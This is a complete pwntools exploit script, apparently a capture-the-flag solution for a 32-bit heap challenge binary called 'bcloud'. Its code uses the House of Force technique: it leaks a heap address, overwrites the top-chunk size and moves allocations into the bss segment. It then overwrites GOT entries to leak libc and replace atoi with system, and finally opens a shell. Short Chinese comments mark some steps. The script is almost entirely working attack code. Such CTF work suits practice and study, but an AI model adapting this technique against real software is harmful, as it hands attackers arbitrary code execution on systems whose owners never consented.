from pwn import *
import sys, os
context.log_level = 'debug'
prog = './bcloud'
elf = ELF(prog)
p = process(prog)

#libc = ELF("./")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()

def add(size, content):
	p.sendlineafter("option--->>\n", '1')
	p.sendlineafter("length of the note content:\n", str(size))
	p.sendlineafter("Input the content:\n", content)
def edit(idx, content):
	p.sendlineafter("option--->>\n", '3')
	p.sendlineafter("id:\n", str(idx))
	p.sendlineafter("new content:\n", content)
def free(idx):
	p.sendlineafter("option--->>\n", '4')
	p.sendlineafter("id:\n", str(idx))
def exp():
	p.sendafter("name:\n", 'a'*0x40)
	p.recvuntil("a"*0x40)
	heap = u32(p.recv(4))-8
	success(hex(heap))
	p.sendafter("Org:\n", 'a'*0x40)
	p.sendlineafter("Host:\n", p32(0xffffffff))    #修改topchunk_size为0xffffffff
	add(0x10, 'a')
	add(0x10, 'a')
	add(0x10, 'a')	
	add((0x804b110-(heap+0x120)), 'a')				#修改top指针到bss段
	add(0x10, p32(elf.got['free'])+p32(elf.got['atoi'])+p32(elf.got['atoi']))   #修改三个chunk的指针
	edit(0, p32(elf.plt['puts']))
	free(1)
	libc = u32(p.recv(4))-0x2d250
	system = libc+0x3ada0
	edit(2, p32(system))
	p.sendline("sh")
	p.interactive()
if __name__ == '__main__':
	exp()
